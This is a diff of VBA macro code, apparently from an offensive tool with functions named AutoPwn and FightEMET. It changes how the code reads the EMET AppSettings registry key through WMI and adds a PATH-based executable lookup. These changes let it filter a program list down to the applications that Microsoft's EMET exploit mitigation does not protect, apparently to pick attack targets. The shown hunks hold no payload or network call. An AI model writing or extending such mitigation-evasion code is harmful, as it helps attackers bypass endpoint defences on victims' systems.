@@ -97,22 +97,41 @@ list(c) = myArray(c)
 Next
 getList = list
 End Function
-Public Function getEMET() As String()
-Set objShell = CreateObject("WScript.Shell")
-Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv")
-oReg.EnumKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", arrSubKeys
-Dim sArray() As String
-Dim Index As Integer
-Index = 0
-For Each strSubKey In arrSubKeys
-oReg.GetQWORDValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & strSubKey & "\", "MitigationOptions", dwValue
-If dwValue Then
-ReDim Preserve sArray(Index)
-sArray(Index) = LCase(strSubKey)
-Index = Index + 1
+Public Function pathOf(program As String) As String
+pathOf = ""
+If program Like "*.exe" Then
+program = program
+Else
+program = program & ".exe"
+End If
+If program Like "*:\*" Then
+pathOf = program
+Exit Function
+Else
+paths = Environ("PATH")
+Dim allPaths() As String
+allPaths = Split(paths, ";")
+For Each Path In allPaths
+ms = Path & "\" & program
+If Not Dir(ms, vbDirectory) = vbNullString Then
+pathOf = ms
+Exit Function
 End If
 Next
-getEMET = sArray
+End If
+End Function
+Public Function getEMET() As String()
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv")
+oReg.EnumValues HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\EMET\AppSettings", arrValues, arrTypes
+Dim smack() As String
+Dim count As Integer
+For count = LBound(arrValues) To UBound(arrValues)
+ReDim Preserve smack(count)
+smack(count) = arrValues(count)
+Next
+getEMET = smack
 End Function
 Public Function AutoPwn() As Long
 myArray = FightEMET
@@ -128,29 +147,29 @@ End Function
 Public Function FightEMET() As String()
 myArray = getList
 smex = getEMET
-Dim Count As Integer
+Dim count As Integer
 Dim sCount As Integer
 Dim kCount As Integer
 kCount = 0
 Dim killedEMET() As String
-For Count = LBound(myArray) To UBound(myArray)
-progStr = myArray(Count)
-Dim superStr As String
-Dim isBad As Boolean
-isBad = False
-If progStr <> "" Then
-Prog = Split(progStr, " ")
-If UBound(Prog) >= 0 Then superStr = LCase(Prog(0))
+For count = LBound(myArray) To UBound(myArray)
+progo = myArray(count)
+prog = Split(progo, " ")
+kk = Replace(prog(0), "\\", "\")
+Dim gg As String
+gg = kk
+pathKK = Replace(pathOf(gg), "\\", "\")
+Dim fudgeBool As Boolean
+fudgeBool = False
 For sCount = LBound(smex) To UBound(smex)
-If superStr Like ("*" & smex(sCount)) Then
-isBad = True
-End If
-Next    
-If isBad = False Then
-ReDim Preserve killedEMET(kCount)
-killedEMET(kCount) = progStr
-kCount = kCount + 1
-End If
+    If LCase(pathKK) Like LCase(smex(sCount)) Then
+        fudgeBool = True
+    End If
+Next
+If fudgeBool = False Then
+        ReDim Preserve killedEMET(kCount)
+        killedEMET(kCount) = myArray(count)
+        kCount = kCount + 1
 End If
 Next
 FightEMET = killedEMET
